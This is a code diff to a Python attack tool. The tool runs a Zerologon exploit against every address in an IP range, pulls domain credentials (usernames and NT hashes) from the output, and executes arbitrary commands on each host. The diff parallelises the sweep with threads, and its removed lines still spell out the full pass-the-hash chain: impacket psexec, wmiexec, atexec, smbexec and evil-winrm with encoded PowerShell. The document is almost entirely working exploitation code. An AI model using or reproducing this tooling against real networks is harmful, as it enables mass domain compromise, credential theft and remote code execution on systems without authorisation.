@@ -3,41 +3,27 @@ import os
 import subprocess
 import re
 import sys
-import threading
 import time
-import base64
+import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from exec_across_ips import run_chain, parse_ip_range
 
 ZEROSHOT_TIMEOUT = 20
-EXEC_TIMEOUT = 15
+MAX_THREADS = 10
 
 VERBOSE = False
 
+# Thread-safe lock for printing
+print_lock = threading.Lock()
+
 def vprint(msg):
     if VERBOSE:
+        with print_lock:
+            print(msg)
+
+def safe_print(msg):
+    with print_lock:
         print(msg)
-
-def parse_ip_range(ip_range):
-    parts = ip_range.split('.')
-    if len(parts) != 4:
-        raise SystemExit("Invalid IP range format")
-
-    def expand(part):
-        vals = []
-        for section in part.split(','):
-            if '-' in section:
-                s, e = map(int, section.split('-'))
-                vals.extend(range(s, e + 1))
-            else:
-                vals.append(int(section))
-        return vals
-
-    expanded = [expand(p) for p in parts]
-    return [f"{a}.{b}.{c}.{d}"
-            for a in expanded[0]
-            for b in expanded[1]
-            for c in expanded[2]
-            for d in expanded[3]]
-
 
 def run_zero_shot(ip):
     if os.path.exists("zerologon-Shot/zerologon-Shot.py") is False:
@@ -53,7 +39,7 @@ def run_zero_shot(ip):
         vprint(f"[v] zerologon output for {ip}:\n{out}")
         return out
     except subprocess.TimeoutExpired:
-        print(f"[!] zerologon-shot timed out for {ip}")
+        safe_print(f"[!] zerologon-shot timed out for {ip}")
         return ""
 
 
@@ -73,98 +59,66 @@ def parse_input(text):
     }
 
 
-def build_cmd(tool, user, target, nthash, command):
-    b64 = base64.b64encode(command.encode("utf-16le")).decode()
+def process_ip(ip, command):
+    """Worker function to process a single IP through zerologon and command execution"""
+    text = run_zero_shot(ip)
+    time.sleep(1)
+    parsed = parse_input(text)
+    user = parsed["user"]
+    nthash = parsed["nthash"]
 
-    if tool == "psexec":
-        return f"impacket-psexec -hashes :{nthash} {user}@{target} 'powershell -enc {b64}'"
-    
-    if tool == "wmiexec":
-        return f"impacket-wmiexec -hashes :{nthash} {user}@{target} 'powershell -enc {b64}'"
+    if not (user and nthash):
+        safe_print(f"[!] No valid creds extracted for {ip}, skipping.")
+        return (ip, None, None)
 
-    if tool == "atexec":
-        return f"impacket-atexec -hashes :{nthash} {user}@{target} 'powershell -enc {b64}'"
-    
-    if tool == "smbexec":
-        return f"nxc smb {target} -H :{nthash} -u {user} -X 'powershell -enc {b64}' --exec-method smbexec"
+    safe_print(f"Parsed Credentials for {ip}: {user}:{nthash}")
 
-    if tool == "winrm":
-        return f"echo 'powershell -enc {b64}' | evil-winrm -i {target} -u {user} -H {nthash}"
+    tool = run_chain(user, ip, nthash, command)
 
-    raise Exception(f"Unknown tool: {tool}")
-
-
-def run_chain(user, ip, nthash, command):
-    chain = ["psexec", "winrm", "wmiexec", "atexec", "smbexec"]
-
-    for tool in chain:
-        cmd = build_cmd(tool, user, ip, nthash, command)
-        print(f"[i] Trying {tool}: {cmd}")
-
-        try:
-            result = subprocess.run(cmd, shell=True, timeout=EXEC_TIMEOUT, capture_output=True)
-            rc = result.returncode
-            out = result.stdout.decode("utf-8", errors="ignore")
-            vprint(f"[v] Output for {tool} on {ip} (rc={rc}):\n{out}")
-        except subprocess.TimeoutExpired:
-            print(f"[-] For {ip}: {tool} timed out.")
-            continue
-        
-        if tool == "atexec" and '[-] SMB SessionError' in out:
-            print(f"[-] For {ip}: {tool} failed.")
-            continue
-
-        if tool == "smbexec" and '[-] SMBEXEC: Could not' in out:
-            print(f"[-] For {ip}: {tool} failed.")
-            continue
-
-        if rc == 0 or (tool == "winrm" and rc == 1):
-            print(f"[+] For {ip}: {tool} succeeded.")
-            return tool
-
-        print(f"[-] For {ip}: {tool} failed.")
-
-    return None
+    if tool is None:
+        safe_print(f"[!] All tools failed for {ip}.")
+        return (ip, None, None)
+    else:
+        safe_print(f"[+] Command executed on {ip} using {tool}.")
+        return (ip, user, tool)
 
 
 def main():
     global VERBOSE
+    import exec_across_ips
 
     if len(sys.argv) < 2:
-        print("Usage: zero_shot_command.py <ip_range> <command> [-v]")
-        print("Example: zero_shot_command.py 10.100.101-130,132.35 'whoami'")
+        print("Usage: zs_command.py <ip_range> <command> [-v]")
+        print("Example: zs_command.py 10.100.101-130,132.35 'whoami'")
         sys.exit(1)
 
     # detect -v anywhere
     if "-v" in sys.argv:
         VERBOSE = True
+        exec_across_ips.VERBOSE = True
         sys.argv.remove("-v")
+
+    # Share the print lock with exec_across_ips module
+    exec_across_ips.print_lock = print_lock
 
     ip_range = sys.argv[1]
     ips = parse_ip_range(ip_range)
 
     command = " ".join(sys.argv[2:]) if len(sys.argv) > 2 else "whoami"
 
-    for ip in ips:
-        text = run_zero_shot(ip)
-        time.sleep(1)
-        parsed = parse_input(text)
-        user = parsed["user"]
-        nthash = parsed["nthash"]
+    print(f"[*] Processing {len(ips)} IPs with {MAX_THREADS} threads...")
 
-        if not (user and nthash):
-            print(f"[!] No valid creds extracted for {ip}, skipping.")
-            continue
+    # Use ThreadPoolExecutor to process IPs in parallel
+    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+        # Submit all tasks
+        futures = [executor.submit(process_ip, ip, command) for ip in ips]
 
-        print(f"Parsed Credentials for {ip}: {user}:{nthash}")
-
-        tool = run_chain(user, ip, nthash, command)
-
-        if tool is None:
-            print(f"[!] All tools failed for {ip}.")
-        else:
-            print(f"[+] Command executed on {ip} using {tool}.")
-            continue
+        # Wait for all tasks to complete
+        for future in as_completed(futures):
+            try:
+                future.result()
+            except Exception as e:
+                safe_print(f"[!] Exception occurred: {e}")
 
 
 if __name__ == "__main__":
